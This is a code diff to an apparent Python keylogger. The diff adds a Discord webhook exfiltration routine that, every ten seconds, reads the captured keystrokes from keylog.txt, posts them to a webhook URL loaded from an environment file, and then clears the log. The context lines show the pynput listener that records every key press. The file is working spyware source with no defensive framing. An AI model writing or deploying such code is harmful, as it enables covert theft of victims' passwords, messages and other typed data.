@@ -1,10 +1,50 @@
 from pynput import keyboard
 import string
+import requests
+from dotenv import load_dotenv
+import os
+import threading
+
+load_dotenv() # load the webhook url from .env file
+
+WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK')
+SEND_INTERVAL = 10
 
 caps_on = False
 shift_pressed = False
 
 valid_chars = string.ascii_letters + string.digits + string.punctuation
+
+
+def send_data_to_webhook(data):
+    if not data.strip():
+        return  # Skip empty data
+
+    content = {
+        'content': data
+    }
+
+    try:
+        response = requests.post(WEBHOOK_URL, json=content)
+        response.raise_for_status()
+        if response.status_code == 200:
+            print("Successfully sent data to Discord!")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send to Discord: {e}")
+
+def periodic_send():
+    threading.Timer(SEND_INTERVAL, periodic_send).start()
+
+    try:
+        if os.path.exists('keylog.txt'):
+            with open('keylog.txt', 'r+') as f:
+                data = f.read()
+                if data:
+                    send_data_to_webhook(data)
+                    f.truncate(0)
+                    f.seek(0)
+    except Exception as e:
+        print(f"Error reading or clearing log: {e}")
 
 def write(char):
     try:
@@ -50,6 +90,8 @@ def on_release(key):
     global shift_pressed
     if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
         shift_pressed = False
+
+periodic_send()
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
